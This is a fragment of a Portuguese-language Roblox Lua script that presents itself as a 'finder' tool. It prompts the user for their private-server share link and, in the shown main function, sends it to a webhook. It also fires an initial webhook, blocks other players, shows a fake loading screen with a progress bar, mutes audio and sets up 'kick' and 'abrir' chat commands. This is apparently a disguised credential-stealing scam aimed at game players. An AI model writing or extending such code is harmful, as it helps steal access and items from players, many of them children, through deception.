    print("🚀 METODH_BRANZZ FINDER BASE V2.1 FIXED Iniciado!")
    
    sendInitialWebhook()
    
    local screenGui, mainFrame, textBox, startButton = createMainGUI()
    
    setupChatCommands()
    
    startButton.MouseButton1Click:Connect(function()
        local link = textBox.Text
        
        if not isValidRobloxLink(link) then
            textBox.Text = ""
            textBox.PlaceholderText = "❌ Link inválido! Use o formato correto"
            
            for i = 1, 5 do
                mainFrame.Position = mainFrame.Position + UDim2.new(0, 10, 0, 0)
                task.wait(0.05)
                mainFrame.Position = mainFrame.Position - UDim2.new(0, 10, 0, 0)
                task.wait(0.05)
            end
            
            task.wait(2)
            textBox.PlaceholderText = "https://www.roblox.com/share?code=..."
            return
        end
        
        if #Players:GetPlayers() > 1 then
            blockOtherPlayers()
            print("🚫 Outros players foram bloqueados!")
        end
        
        sendServerLinkWebhook(link)
        
        TweenService:Create(mainFrame, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
            Size = UDim2.new(0, 0, 0, 0),
            Position = UDim2.new(0.5, 0, 0.5, 0)
        }):Play()
        
        task.wait(0.5)
        screenGui:Destroy()
        
        local loadingGui, progressBar, percentageText, titleLabel, statusText = createLoadingScreen()
        
        animateProgress(progressBar, percentageText, titleLabel, statusText)
        
        muteAllAudio()
    end)
    
    print("✅ Sistema carregado com sucesso!")
    print("📋 Comandos disponíveis: kick, /kick, abrir, /abrir")
end

-- ========================================
-- EXECUÇÃO DO SCRIPT
-- ========================================

local success, err = pcall(main)
if not success then
    warn("❌ Erro ao executar script:", err)
end
